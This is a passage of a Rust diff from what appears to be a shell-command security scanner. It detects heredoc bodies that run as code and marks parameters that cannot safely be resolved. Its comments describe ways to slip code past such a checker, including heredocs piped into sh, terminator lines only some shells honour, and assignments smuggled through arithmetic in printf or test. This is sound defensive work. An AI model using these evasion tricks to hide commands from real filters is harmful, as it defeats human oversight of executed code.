+/// The words of one segment's lead that open or close compound commands,
+/// with the byte after each (see [`posix_compound_words`]).
+type PosixCompoundWords = Vec<(&'static str, usize)>;
+
+/// The words of `text[range]`'s lead that open or close compound commands
+/// (`if`, `while`, `until`, `for`, `select`, `case`, `{` and `fi`, `done`,
+/// `esac`, `}`; plus `)` after a case pattern), in order, with the byte
+/// after each. A group that starts the segment (`{ ...; }`, `( ... )`) is
+/// kept whole by the tokenizer with its own closer and adds nothing.
+fn posix_compound_words(text: &str, range: std::ops::Range<usize>) -> PosixCompoundWords {
+    const COUNTED: &[&str] = &["if", "while", "until", "for", "select", "case", ")"];
+    let mut words = Vec::new();
+    let mut start = range.start;
+    loop {
+        let lead = posix_command_lead(text, start..range.end, usize::MAX);
+        words.extend(
+            lead.words
+                .iter()
+                .filter(|word| COUNTED.contains(&word.word))
+                .map(|word| (word.word, word.end)),
+        );
+        match lead.end {
+            // A `{` after other reserved words (`then { a`) is not kept
+            // whole: the tokenizer ends the segment at its first `;`.
+            PosixLeadEnd::Group(open) if text.as_bytes()[open] == b'{' && open != range.start => {
+                words.push(("{", open + 1));
+                start = open + 1;
+            }
+            PosixLeadEnd::Closer(closer, closer_start) => {
+                words.push((closer, closer_start + closer.len()));
+                break;
+            }
+            _ => break,
+        }
+    }
+    words
+}
+
+/// The body of the group that the `{` or `(` at `text[open]` opens in a
+/// segment ending at `end`, and the byte of its closing `}` or `)` when it
+/// closes within the segment. `None` once the work bound is spent.
+fn posix_group_body(
+    text: &str,
+    open: usize,
+    end: usize,
+    cx: &mut HeredocReadContext,
+) -> Option<(std::ops::Range<usize>, Option<usize>)> {
+    let start = open + 1;
+    let end = end.max(start);
+    let close = if text.as_bytes()[open] == b'(' {
+        // Read from the `(` itself: it starts a word in code.
+        text.get(open..end)
+            .and_then(|group| posix_innermost_open_body(group, 1))
+            .map(|body| open + body.end)
+            .filter(|&close| close < end && text.as_bytes().get(close) == Some(&b')'))
+    } else {
+        let body = text.get(start..end).unwrap_or_default();
+        let segments = cx.tokenize(body)?;
+        posix_brace_group_close(body, &segments).map(|offset| start + offset)
+    };
+    Some((start..close.unwrap_or(end), close))
+}
+
+/// The offset in `body` (the text after a `{`, read into `segments`) of the
+/// `}` that closes the group.
+fn posix_brace_group_close(body: &str, segments: &[tokenize::Segment]) -> Option<usize> {
+    let mut depth = 0usize;
+    for segment in segments {
+        for (word, end) in posix_compound_words(body, segment.byte_range.clone()) {
+            match word {
+                "{" => depth += 1,
+                "}" if depth == 0 => return Some(end - 1),
+                "}" => depth -= 1,
+                _ => {}
+            }
+        }
+    }
+    None
+}
+
+/// A descriptor number without its leading zeros (`03` is descriptor 3).
+fn descriptor_number(digits: &str) -> Option<String> {
+    if digits.is_empty() || !digits.bytes().all(|byte| byte.is_ascii_digit()) {
+        return None;
+    }
+    let trimmed = digits.trim_start_matches('0');
+    Some(if trimmed.is_empty() { "0" } else { trimmed }.to_string())
+}
+
+/// The readers of the heredoc `target` on the header `line`: the command on
+/// the whole line, and the command inside the innermost `(`/`$(`/backtick
+/// body open at the operator (the tokenizer does not split inside `$(...)`,
+/// so for `x="$(sh <<'EOF'` the reader is found in that body). The body is
+/// code if either reads it as code and ambiguous if either is ambiguous.
+/// The flag is set when the line closes a compound command that starts on an
+/// earlier line (`done <<'EOF'`, and a subshell's `) <<'EOF'` or
+/// `sh ) <<'EOF'`): the whole program is read for it once every heredoc body
+/// is masked.
+fn heredoc_readers_for_header(
     line: &str,
     specs: &[PosixHeredocSpec],
     target: &PosixHeredocSpec,
-) -> Option<ShellType> {
-    if !target.stdin {
-        return None;
-    }
+    work: &mut usize,
+) -> (HeredocReading, bool) {
     let mut masked = line.as_bytes().to_vec();
     for spec in specs {
         mask_non_newline(&mut masked, spec.operator_range.clone());
     }
-    let masked = String::from_utf8(masked).ok()?;
-    let segment = tokenize::tokenize(&masked, ShellType::Posix)
-        .into_iter()
-        .find(|segment| {
-            segment.byte_range.start <= target.operator_range.start
-                && target.operator_range.start <= segment.byte_range.end
-        })
-        .or_else(|| {
-            tokenize::tokenize(&masked, ShellType::Posix)
-                .into_iter()
-                .next()
-        })?;
-    let (command, args) = resolve_wrapped_command_for_shell(&segment, ShellType::Posix)?;
-    shell_reads_heredoc_from_stdin(&command, &args)
+    let Ok(masked) = String::from_utf8(masked) else {
+        return (HeredocReading::DATA, false);
+    };
+    let operator = target.operator_range.start;
+    let operator_end = target.operator_range.end;
+    let mut cx = HeredocReadContext {
+        fd: &target.fd,
+        work,
+    };
+    let segments = tokenize::tokenize(&masked, ShellType::Posix);
+    // The line and the body open at the operator are read once per heredoc
+    // outside the work bound; only what is read through them counts.
+    let line_reading = heredoc_reader_at(
+        &masked,
+        &segments,
+        None,
+        operator,
+        operator_end,
+        MAX_HEREDOC_READER_DEPTH,
+        &mut cx,
+    );
+    let closes_earlier_group = heredoc_follows_unopened_close(&masked, &segments, operator);
+    let mut reading = line_reading.unwrap_or(HeredocReading::DATA);
+    if let Some(body) = posix_innermost_open_body(&masked, operator) {
+        if let Some(text) = masked.get(body.clone()) {
+            reading = reading.or(heredoc_reader_at(
+                text,
+                &tokenize::tokenize(text, ShellType::Posix),
+                None,
+                operator - body.start,
+                operator_end.saturating_sub(body.start).min(text.len()),
+                MAX_HEREDOC_READER_DEPTH,
+                &mut cx,
+            )
+            .unwrap_or(HeredocReading::AMBIGUOUS));
+        }
+    }
+    (reading, line_reading.is_none() || closes_earlier_group)
+}
+
+/// Whether the heredoc operator at `operator` in `line` (read into
+/// `segments`) sits on, or in, a group opened on an earlier line, which only
+/// the whole program shows: its command holds a `)` that closes nothing
+/// opened on the line, either before the operator with nothing but
+/// redirections after it (the heredoc is on the group: `) <<'EOF'`,
+/// `sh ) 2>/dev/null <<'EOF'`, `cat x ) <<'EOF'`), or after the operator
+/// (the heredoc is on the group's last command: `sh <<'EOF' )`). Two such
+/// `)` before the operator also close a scope opened on an earlier line,
+/// as a command holds at most one case pattern's (`cat) in x) sh <<'EOF'`
+/// after `case $(echo x |`). A case arm's `pattern) <<'EOF'` reads like the
+/// first and is read again as data.
+fn heredoc_follows_unopened_close(
+    line: &str,
+    segments: &[tokenize::Segment],
+    operator: usize,
+) -> bool {
+    let Some(segment) =
+        heredoc_operator_segment(line, segments, operator).and_then(|index| segments.get(index))
+    else {
+        return false;
+    };
+    let range = segment.byte_range.clone();
+    let mut from = range.start;
+    let mut last_before = None;
+    while let Some(close_end) = posix_unopened_close_end(line.as_bytes(), from, range.end) {
+        if close_end > operator || last_before.is_some() {
+            return true;
+        }
+        last_before = Some(close_end);
+        from = close_end;
+    }
+    last_before.is_some_and(|close_end| {
+        crate::escalation::args_without_redirections(&tokenize::split_words(
+            line.get(close_end..range.end).unwrap_or_default(),
+        ))
+        .is_empty()
+    })
+}
+
+/// The byte range of the innermost `(`, `$(`, `<(`, `>(` or backtick body
+/// that is open at `at` on a heredoc header line, up to its closer on that
+/// line or the line end, read from code at the line start. `None` when `at`
+/// sits in no such body. In double quotes only `$(` and a backtick open one.
+fn posix_innermost_open_body(line: &str, at: usize) -> Option<std::ops::Range<usize>> {
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum Kind {
+        Top,
+        Paren,
+        Backtick,
+    }
+    struct Frame {
+        kind: Kind,
+        start: usize,
+        quote: ShellLexQuote,
+    }
+    let bytes = line.as_bytes();
+    let mut frames = vec![Frame {
+        kind: Kind::Top,
+        start: 0,
+        quote: ShellLexQuote::Normal,
+    }];
+    // The frame count and body start at `at`.
+    let mut target: Option<(usize, usize)> = None;
+    let mut word_start = true;
+    let mut dollar_run = 0usize;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if target.is_none() && index >= at {
+            let frame = frames.last()?;
+            if frame.kind == Kind::Top {
+                return None;
+            }
+            target = Some((frames.len(), frame.start));
+        }
+        let byte = bytes[index];
+        let frame = frames.last_mut()?;
+        let closes = match frame.quote {
+            // The shells cut a backtick body out at its first unescaped
+            // backtick before they read its quotes.
+            ShellLexQuote::Single | ShellLexQuote::Double
+                if byte == b'`' && frame.kind == Kind::Backtick =>
+            {
+                true
+            }
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    frame.quote = ShellLexQuote::Normal;
+                }
+                false
+            }
+            ShellLexQuote::Double => match byte {
+                b'\\' => {
+                    index += 1;
+                    false
+                }
+                b'"' => {
+                    frame.quote = ShellLexQuote::Normal;
+                    false
+                }
+                b'`' => {
+                    frames.push(Frame {
+                        kind: Kind::Backtick,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                b'(' if dollar_run % 2 == 1 => {
+                    frames.push(Frame {
+                        kind: Kind::Paren,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                _ => false,
+            },
+            ShellLexQuote::Normal => match byte {
+                b'\\' => {
+                    index += 1;
+                    word_start = false;
+                    false
+                }
+                b'\'' => {
+                    frame.quote = ShellLexQuote::Single;
+                    word_start = false;
+                    false
+                }
+                b'"' => {
+                    frame.quote = ShellLexQuote::Double;
+                    word_start = false;
+                    false
+                }
+                // A comment: no operator after it on this line.
+                b'#' if word_start => return target.map(|(_, start)| start..index),
+                b'`' if frame.kind == Kind::Backtick => true,
+                b'`' => {
+                    frames.push(Frame {
+                        kind: Kind::Backtick,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                b'(' => {
+                    frames.push(Frame {
+                        kind: Kind::Paren,
+                        start: index + 1,
+                        quote: ShellLexQuote::Normal,
+                    });
+                    word_start = true;
+                    false
+                }
+                b')' if frame.kind == Kind::Paren => true,
+                _ => {
+                    word_start = matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|');
+                    false
+                }
+            },
+        };
+        if closes {
+            if let Some((_, start)) = target.filter(|(depth, _)| frames.len() == *depth) {
+                return Some(start..index);
+            }
+            frames.pop();
+            word_start = false;
+        }
+        dollar_run = if byte == b'$' { dollar_run + 1 } else { 0 };
+        index += 1;
+    }
+    target.map(|(_, start)| start..bytes.len())
+}
+
+/// Where a heredoc's body ends.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum HeredocEnd {
+    /// The terminator line: its start and its end (before the newline).
+    At(usize, usize),
+    /// The line that ends the body differs between the shells.
+    ShellDependent,
+    Unterminated,
+}
+
+/// The line that ends the heredoc body starting at `body_start`. Each line is
+/// compared with the delimiter word byte for byte (after `<<-` strips leading
+/// tabs). In an unquoted heredoc a line ending in an unescaped backslash is
+/// continued: no shell compares the next line on its own (bash 5.3 and 3.2,
+/// dash, zsh and ksh93 all read `foo\` + `EOF` as data). bash and zsh then
+/// compare the joined line, dash only drops backslash-newlines at the start
+/// of a line (it ends `\` + `EOF`, not `EO\` + `F`) and ksh compares only a
+/// line that is not continued, so a joined line equal to the word ends the
+/// body in some shells only.
+fn heredoc_end(raw: &str, body_start: usize, spec: &PosixHeredocSpec) -> HeredocEnd {
+    let mut cursor = body_start;
+    let mut joined: Option<String> = None;
+    while cursor <= raw.len() {
+        let line_end = raw[cursor..]
+            .find('\n')
+            .map_or(raw.len(), |offset| cursor + offset);
+        let raw_line = raw.get(cursor..line_end).unwrap_or_default();
+        let backslashes = raw_line.bytes().rev().take_while(|&b| b == b'\\').count();
+        if !spec.quoted && line_end < raw.len() && backslashes % 2 == 1 {
+            joined
+                .get_or_insert_with(String::new)
+                .push_str(&raw_line[..raw_line.len() - 1]);
+            cursor = line_end + 1;
+            continue;
+        }
+        match joined.take() {
+            Some(mut joined) => {
+                joined.push_str(raw_line);
+                if terminator_match(&joined, spec).is_some() {
+                    return HeredocEnd::ShellDependent;
+                }
+            }
+            // The line's CR must match the word's; a shell that drops CRs
+            // (Cygwin bash's igncr) would end the heredoc here anyway. Where
+            // the two disagree the boundary depends on the shell, and ending
+            // it early would let a data line such as `cat <<Z` open a heredoc
+            // that hides code.
+            None => match terminator_match(raw_line, spec) {
+                Some(true) => return HeredocEnd::At(cursor, line_end),
+                Some(false) => return HeredocEnd::ShellDependent,
+                None => {}
+            },
+        }
+        if line_end == raw.len() {
+            break;
+        }
+        cursor = line_end + 1;
+    }
+    HeredocEnd::Unterminated
+}
+
+/// `Some` when `line` is the delimiter word once a trailing CR is set aside,
+/// holding whether that CR matches the word's (a CRLF header line).
+fn terminator_match(line: &str, spec: &PosixHeredocSpec) -> Option<bool> {
+    let without_cr = line.strip_suffix('\r').unwrap_or(line);
+    let candidate = if spec.strip_tabs {
+        without_cr.trim_start_matches('\t')
+    } else {
+        without_cr
+    };
+    (candidate == spec.delimiter).then(|| line.ends_with('\r') == spec.word_ends_in_cr)
 }
 
 fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
@@ -4230,17 +6168,51 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
     let mut masked = raw.as_bytes().to_vec();
     let mut cursor = 0usize;
     let mut count = 0usize;
-    let mut header_quote = ShellLexQuote::Normal;
-    while cursor < raw.len() {
-        let header_end = raw[cursor..]
+    let mut header_lex = PosixHeaderLex::default();
+    // Shell text the heredoc readers may still tokenize, and the heredocs
+    // read again against the whole program.
+    let mut work = MAX_HEREDOC_READER_WORK_BYTES;
+    let mut compound_heredocs: Vec<PendingHeredoc> = Vec::new();
+    let line_end = |from: usize| {
+        raw[from..]
             .find('\n')
-            .map_or(raw.len(), |offset| cursor + offset);
+            .map_or(raw.len(), |offset| from + offset)
+    };
+    while cursor < raw.len() {
+        // The header is one logical line: a backslash-newline joins the next
+        // physical line to it, and the bodies start after its last line
+        // (`cat <<'EOF' \` + `| sh` pipes the body into sh).
+        let mut header_end = line_end(cursor);
+        let mut line_start = cursor;
+        let mut specs = Vec::new();
+        let mut unsupported = false;
+        loop {
+            let (mut found, line_unsupported, final_lex) = posix_heredoc_specs(
+                raw.get(line_start..header_end).unwrap_or_default(),
+                std::mem::take(&mut header_lex),
+            );
+            for spec in &mut found {
+                spec.operator_range = (spec.operator_range.start + line_start)
+                    ..(spec.operator_range.end + line_start);
+            }
+            specs.extend(found);
+            unsupported |= line_unsupported;
+            let continued = final_lex.continued.is_some();
+            header_lex = final_lex;
+            if !continued || header_end == raw.len() {
+                break;
+            }
+            line_start = header_end + 1;
+            header_end = line_end(line_start);
+        }
+        header_lex.continued = None;
         let header = raw.get(cursor..header_end).unwrap_or_default();
-        let (mut specs, unsupported, final_quote) = posix_heredoc_specs(header, header_quote);
-        header_quote = final_quote;
-        for spec in &mut specs {
-            spec.operator_range =
-                (spec.operator_range.start + cursor)..(spec.operator_range.end + cursor);
+        // A heredoc header that leaves a quote, an arithmetic expression or
+        // a `${` open has no line where its bodies certainly start.
+        if !specs.is_empty()
+            && (header_lex.quote != ShellLexQuote::Normal || header_lex.inert.is_some())
+        {
+            unsupported = true;
         }
         for spec in &specs {
             mask_non_newline(&mut masked, spec.operator_range.clone());
@@ -4272,39 +6244,25 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                 delimiter: spec.delimiter.clone(),
                 quoted: spec.quoted,
                 strip_tabs: spec.strip_tabs,
+                word_ends_in_cr: spec.word_ends_in_cr,
                 operator_range: (spec.operator_range.start - cursor)
                     ..(spec.operator_range.end - cursor),
-                stdin: spec.stdin,
+                fd: spec.fd.clone(),
             })
             .collect();
         let mut body_cursor = header_end + 1;
         for (spec, relative) in specs.iter().zip(relative_specs.iter()) {
             let body_start = body_cursor;
-            let mut terminator = None;
-            while body_cursor <= raw.len() {
-                let line_end = raw[body_cursor..]
-                    .find('\n')
-                    .map_or(raw.len(), |offset| body_cursor + offset);
-                let line = raw
-                    .get(body_cursor..line_end)
-                    .unwrap_or_default()
-                    .strip_suffix('\r')
-                    .unwrap_or_else(|| raw.get(body_cursor..line_end).unwrap_or_default());
-                let candidate = if spec.strip_tabs {
-                    line.trim_start_matches('\t')
-                } else {
-                    line
-                };
-                if candidate == spec.delimiter {
-                    terminator = Some((body_cursor, line_end));
-                    break;
-                }
-                if line_end == raw.len() {
-                    break;
-                }
-                body_cursor = line_end + 1;
+            let end = heredoc_end(raw, body_start, spec);
+            if end == HeredocEnd::ShellDependent {
+                // Fail closed with every line left visible.
+                recovery
+                    .gap
+                    .get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                body_cursor = raw.len();
+                break;
             }
-            let Some((terminator_start, terminator_end)) = terminator else {
+            let HeredocEnd::At(terminator_start, terminator_end) = end else {
                 recovery
                     .gap
                     .get_or_insert(ShellExecutionGap::IncompleteExecutableBody);
@@ -4326,6 +6284,17 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                     .gap
                     .get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
             } else {
+                recovery.spans.push(PosixHeredocSpan {
+                    header: cursor..header_end,
+                    operator: spec.operator_range.clone(),
+                    body: body_start..terminator_start,
+                    through_terminator: body_start..if terminator_end < raw.len() {
+                        terminator_end + 1
+                    } else {
+                        terminator_end
+                    },
+                    quoted: spec.quoted,
+                });
                 let body = if spec.strip_tabs {
                     strip_heredoc_tabs(body)
                 } else {
@@ -4334,19 +6303,19 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                 if !spec.quoted {
                     scan_unquoted_heredoc_expansions(&body, &mut recovery);
                 }
-                if let Some(shell) =
-                    heredoc_interpreter_for_header(header, &relative_specs, relative)
-                {
-                    let input = if spec.quoted {
-                        body
-                    } else {
-                        unescape_unquoted_heredoc(&body)
-                    };
-                    if !input.trim().is_empty() {
-                        recovery
-                            .bodies
-                            .push(ExecutableBody::without_origin(input, shell));
-                    }
+                let (reading, compound_before_line) =
+                    heredoc_readers_for_header(header, &relative_specs, relative, &mut work);
+                let heredoc = PendingHeredoc {
+                    reading,
+                    operator: spec.operator_range.clone(),
+                    fd: spec.fd.clone(),
+                    body,
+                    quoted: spec.quoted,
+                };
+                if compound_before_line {
+                    compound_heredocs.push(heredoc);
+                } else {
+                    recovery.record_heredoc(heredoc.reading, heredoc.body, heredoc.quoted);
                 }
             }
             body_cursor = if terminator_end < raw.len() {
@@ -4357,8 +6326,81 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
         }
         cursor = body_cursor;
     }
-    recovery.sanitized = String::from_utf8(masked).unwrap_or_else(|_| raw.to_string());
+    let program = String::from_utf8(masked);
+    // A heredoc whose header closes a compound command started on an earlier
+    // line (`while read l; do` ... `done <<'EOF'`): read the whole program,
+    // with every heredoc body masked, once for all of them.
+    if !compound_heredocs.is_empty() {
+        let segments = program
+            .as_deref()
+            .ok()
+            .map(|program| tokenize::tokenize(program, ShellType::Posix));
+        let compound_words: Option<Vec<PosixCompoundWords>> = program
+            .as_deref()
+            .ok()
+            .zip(segments.as_deref())
+            .map(|(program, segments)| {
+                segments
+                    .iter()
+                    .map(|segment| posix_compound_words(program, segment.byte_range.clone()))
+                    .collect()
+            });
+        for heredoc in compound_heredocs {
+            let reading = match (program.as_deref(), segments.as_deref()) {
+                (Ok(program), Some(segments)) => {
+                    let mut cx = HeredocReadContext {
+                        fd: &heredoc.fd,
+                        work: &mut work,
+                    };
+                    heredoc_reader_at(
+                        program,
+                        segments,
+                        compound_words.as_deref(),
+                        heredoc.operator.start,
+                        heredoc.operator.end,
+                        MAX_HEREDOC_READER_DEPTH,
+                        &mut cx,
+                    )
+                    .unwrap_or(HeredocReading::AMBIGUOUS)
+                }
+                _ => HeredocReading::AMBIGUOUS,
+            };
+            recovery.record_heredoc(heredoc.reading.or(reading), heredoc.body, heredoc.quoted);
+        }
+    }
+    recovery.sanitized = program.unwrap_or_else(|_| raw.to_string());
     recovery
+}
+
+/// A heredoc body and how it is read, before it is recorded.
+struct PendingHeredoc {
+    reading: HeredocReading,
+    operator: std::ops::Range<usize>,
+    fd: String,
+    body: String,
+    quoted: bool,
+}
+
+impl PosixHeredocRecovery {
+    /// Record a heredoc body: code for the shell that runs it, a gap when it
+    /// is ambiguous.
+    fn record_heredoc(&mut self, reading: HeredocReading, body: String, quoted: bool) {
+        if reading.ambiguous {
+            self.gap
+                .get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        if let Some(shell) = reading.shell {
+            let input = if quoted {
+                body
+            } else {
+                unescape_unquoted_heredoc(&body)
+            };
+            if !input.trim().is_empty() {
+                self.bodies
+                    .push(ExecutableBody::without_origin(input, shell));
+            }
+        }
+    }
 }
 
 /// Return the shell source view with bounded heredoc payloads masked. This is
@@ -4568,6 +6610,840 @@ fn bound_executable_bodies(scan: &mut ExecutableSubstitutionScan) -> bool {
     exhausted
 }
 
+const MAX_VARIABLE_COMMAND_INPUT_BYTES: usize = 16 * 1024;
+
+/// Builtins and reserved words of bash, zsh, ksh and POSIX sh (plus zsh module
+/// builtins that can be autoloaded or already be loaded in the live shell,
+/// such as `stat -A NAME`). Any of them may bind or rebind a variable,
+/// change command dispatch, or open a compound the flat segment model below
+/// cannot follow, so an input using one is never resolved, except for the
+/// small set of side-effect-free builtins in `POSIX_INERT_BUILTINS`.
+const POSIX_STATEFUL_WORDS: &[&str] = &[
+    "!",
+    "-",
+    ".",
+    ":",
+    "[",
+    "[[",
+    "]]",
+    "{",
+    "}",
+    "alarm",
+    "alias",
+    "autoload",
+    "bg",
+    "bind",
+    "bindkey",
+    "break",
+    "builtin",
+    "bye",
+    "caller",
+    "cap",
+    "case",
+    "cd",
+    "chdir",
+    "clone",
+    "command",
+    "compadd",
+    "comparguments",
+    "compcall",
+    "compctl",
+    "compdescribe",
+    "compfiles",
+    "compgen",
+    "complete",
+    "compgroups",
+    "compopt",
+    "compound",
+    "compquote",
+    "compset",
+    "comptags",
+    "comptry",
+    "compvalues",
+    "continue",
+    "coproc",
+    "declare",
+    "dirs",
+    "disable",
+    "disown",
+    "do",
+    "done",
+    "echo",
+    "echotc",
+    "echoti",
+    "elif",
+    "else",
+    "emulate",
+    "enable",
+    "end",
+    "enum",
+    "esac",
+    "eval",
+    "example",
+    "exec",
+    "exit",
+    "export",
+    "false",
+    "fc",
+    "fg",
+    "fi",
+    "float",
+    "for",
+    "foreach",
+    "function",
+    "functions",
+    "getcap",
+    "getln",
+    "getopts",
+    "hash",
+    "help",
+    "hist",
+    "history",
+    "if",
+    "in",
+    "integer",
+    "jobs",
+    "kill",
+    "let",
+    "limit",
+    "local",
+    "log",
+    "logout",
+    "mapfile",
+    "nameref",
+    "nocorrect",
+    "noglob",
+    "pcre_compile",
+    "pcre_match",
+    "pcre_study",
+    "popd",
+    "print",
+    "printf",
+    "private",
+    "pushd",
+    "pushln",
+    "pwd",
+    "r",
+    "read",
+    "readarray",
+    "readonly",
+    "rehash",
+    "repeat",
+    "return",
+    "sched",
+    "select",
+    "set",
+    "setcap",
+    "setopt",
+    "shift",
+    "shopt",
+    "source",
+    "stat",
+    "strftime",
+    "suspend",
+    "syserror",
+    "sysopen",
+    "sysread",
+    "sysseek",
+    "syswrite",
+    "test",
+    "then",
+    "time",
+    "times",
+    "trap",
+    "true",
+    "ttyctl",
+    "type",
+    "typeset",
+    "ulimit",
+    "umask",
+    "unalias",
+    "unfunction",
+    "unhash",
+    "unlimit",
+    "unset",
+    "unsetopt",
+    "until",
+    "vared",
+    "wait",
+    "whence",
+    "where",
+    "which",
+    "while",
+    "zcompile",
+    "zcurses",
+    "zdelattr",
+    "zformat",
+    "zftp",
+    "zgdbmpath",
+    "zgetattr",
+    "zle",
+    "zlistattr",
+    "zmodload",
+    "zparseopts",
+    "zprof",
+    "zpty",
+    "zregexparse",
+    "zselect",
+    "zsetattr",
+    "zsocket",
+    "zstat",
+    "zstyle",
+    "zsystem",
+    "ztcp",
+    "ztie",
+    "zuntie",
+];
+
+/// Builtins that neither bind variables nor change dispatch (`printf` and
+/// `test`/`[` only in the restricted forms checked separately).
+const POSIX_INERT_BUILTINS: &[&str] = &[":", "[", "echo", "false", "printf", "pwd", "test", "true"];
+
+/// Shell-maintained or specially-typed parameters whose expansion can differ
+/// from the value just assigned (bash and zsh), plus `_`. Includes every
+/// integer-typed special of zsh (with its modules loaded) and ksh: assigning
+/// one evaluates the value as arithmetic, so `V=BIN=9; MAILCHECK=V` assigns
+/// `BIN`. A name in this list is never resolved and never accepted as an
+/// assignment-only segment.
+const POSIX_SPECIAL_PARAMETERS: &[&str] = &[
+    "_",
+    "ARGC",
+    "CDPATH",
+    "COLUMNS",
+    "DIRSTACK",
+    "EGID",
+    "ENV",
+    "ERRNO",
+    "EPOCHREALTIME",
+    "EPOCHSECONDS",
+    "EUID",
+    "FIGNORE",
+    "FPATH",
+    "FUNCNAME",
+    "FUNCNEST",
+    "GID",
+    "GLOBIGNORE",
+    "GROUPS",
+    "HISTCHARS",
+    "HISTCMD",
+    "HOME",
+    "HOSTNAME",
+    "HOSTTYPE",
+    "IFS",
+    "JOBMAX",
+    "KEYTIMEOUT",
+    "KEYBOARD_HACK",
+    "LANG",
+    "LINENO",
+    "LINES",
+    "LISTMAX",
+    "LOGCHECK",
+    "MAILCHECK",
+    "MACHTYPE",
+    "MAILPATH",
+    "MANPATH",
+    "MAPFILE",
+    "MODULE_PATH",
+    "NULLCMD",
+    "OLDPWD",
+    "OPTARG",
+    "OPTERR",
+    "OPTIND",
+    "OSTYPE",
+    "PATH",
+    "PIPESTATUS",
+    "POSIXLY_CORRECT",
+    "PPID",
+    "PROMPT",
+    "PROMPT2",
+    "PROMPT3",
+    "PROMPT4",
+    "PS1",
+    "PS2",
+    "PS3",
+    "PS4",
+    "PSVAR",
+    "PWD",
+    "RANDOM",
+    "READNULLCMD",
+    "REPLY",
+    "SAVEHIST",
+    "SECONDS",
+    "SHELLOPTS",
+    "SHLVL",
+    "SPROMPT",
+    "SRANDOM",
+    "TERM",
+    "TERMINFO",
+    "TMOUT",
+    "TRY_BLOCK_ERROR",
+    "TRY_BLOCK_INTERRUPT",
+    "TTYIDLE",
+    "UID",
+    "USERNAME",
+    "WORDCHARS",
+    "ZCURSES_COLORS",
+    "ZCURSES_COLOR_PAIRS",
+    "aliases",
+    "argv",
+    "builtins",
+    "cdpath",
+    "commands",
+    "dirstack",
+    "dis_aliases",
+    "dis_builtins",
+    "dis_functions",
+    "dis_galiases",
+    "dis_patchars",
+    "dis_reswords",
+    "dis_saliases",
+    "epochtime",
+    "errnos",
+    "exint",
+    "fignore",
+    "fpath",
+    "funcfiletrace",
+    "funcsourcetrace",
+    "funcstack",
+    "functions",
+    "functrace",
+    "galiases",
+    "histchars",
+    "history",
+    "historywords",
+    "jobdirs",
+    "jobstates",
+    "jobtexts",
+    "keymaps",
+    "mailpath",
+    "manpath",
+    "mapfile",
+    "match",
+    "mbegin",
+    "mend",
+    "module_path",
+    "modules",
+    "nameddirs",
+    "options",
+    "parameters",
+    "patchars",
+    "path",
+    "pipestatus",
+    "prompt",
+    "psvar",
+    "reply",
+    "reswords",
+    "saliases",
+    "signals",
+    "status",
+    "sysparams",
+    "termcap",
+    "terminfo",
+    "userdirs",
+    "usergroups",
+    "watch",
+    "widgets",
+    "zsh_eval_context",
+];
+
+fn posix_variable_name_is_resolvable(name: &str) -> bool {
+    let mut chars = name.chars();
+    chars
+        .next()
+        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
+        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+        && !POSIX_SPECIAL_PARAMETERS.contains(&name)
+        && ![
+            "BASH", "ZSH", "COMP", "READLINE", "HIST", "LC_", "zle", "ZLE",
+        ]
+        .iter()
+        .any(|prefix| name.starts_with(prefix))
+}
+
+/// The literal value of `NAME=VALUE` when the whole segment is exactly one
+/// assignment of a plain or fully quoted value made of characters that need no
+/// quoting, cannot expand, and cannot split or glob.
+fn posix_literal_assignment(segment: &tokenize::Segment) -> Option<(&str, &str)> {
+    if !segment.args.is_empty() || segment.command.is_some() {
+        return None;
+    }
+    let (name, value) = segment.raw.split_once('=')?;
+    if !posix_variable_name_is_resolvable(name) {
+        return None;
+    }
+    let value = match value.as_bytes().first() {
+        Some(b'\'') => value.strip_prefix('\'')?.strip_suffix('\'')?,
+        Some(b'"') => value.strip_prefix('"')?.strip_suffix('"')?,
+        _ => value,
+    };
+    (!value.is_empty()
+        && value
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || b"_./+:@%,-".contains(&byte)))
+    .then_some((name, value))
+}
+
+/// `"$NAME"` or `"${NAME}"`: quoted, so the value is never split or globbed.
+fn posix_quoted_variable_command_name(command: &str) -> Option<&str> {
+    let inner = command.strip_prefix('"')?.strip_suffix('"')?;
+    let name = inner
+        .strip_prefix("${")
+        .and_then(|rest| rest.strip_suffix('}'))
+        .or_else(|| inner.strip_prefix('$'))?;
+    posix_variable_name_is_resolvable(name).then_some(name)
+}
+
+/// True when executing this word cannot bind a shell variable or change
+/// dispatch in the current shell: an external command (child process) or one
+/// of the inert builtins. zsh and ksh evaluate the `printf` arguments of
+/// numeric conversions (`%d`, `%*s`) as arithmetic, so `printf '%d' 'BI''N=9'`
+/// assigns `BIN`; ksh does the same for `test`/`[` integer operands, even
+/// fully literal ones (`[ 'BI''N=9' -eq 9 ]`), zsh evaluates the `-t`
+/// operand (`[ -t 'BI''N=9' ]`), and bash evaluates `test -v` array
+/// subscripts. So `printf` counts as inert only
+/// without options and with literal arguments, and then only when its format
+/// has text conversions alone or no argument after the format has a letter or
+/// `_` (the start of an arithmetic name); `test`/`[` only without subscripts,
+/// integer comparisons, `-t`, `-v` or `-R`.
+fn posix_command_word_is_inert(command: &str, args: &[String]) -> bool {
+    if command.contains('/') {
+        return true;
+    }
+    if !POSIX_STATEFUL_WORDS.contains(&command) {
+        return !command.contains('=');
+    }
+    if !POSIX_INERT_BUILTINS.contains(&command) {
+        return false;
